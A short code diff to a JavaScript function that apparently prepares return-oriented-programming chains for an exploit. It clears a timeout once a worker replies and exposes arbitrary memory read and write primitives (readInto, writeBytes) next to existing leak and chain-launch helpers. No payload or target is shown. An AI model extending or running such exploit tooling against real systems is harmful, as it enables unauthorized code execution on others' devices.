@@ -224,13 +224,15 @@ async function prepareRop(p) {
 
     const completed = await new Promise((resolve) => {
       let settled = false;
+      let timer;
       const finish = (value) => {
         if (settled) return;
         settled = true;
+        clearTimeout(timer);
         resolve(value);
       };
       worker.onmessage = () => finish(true);
-      setTimeout(() => finish(false), ROP_WAIT_MS);
+      timer = setTimeout(() => finish(false), ROP_WAIT_MS);
       worker.postMessage(0);
     });
 
@@ -247,6 +249,8 @@ async function prepareRop(p) {
     read4: p.read4,
     read2: p.read2,
     read1: p.read1,
+    readInto: p.readInto,
+    writeBytes: p.writeBytes,
     leakval: p.leakval,
     pre_chain: prepareChain,
     launch_chain: launchChain,
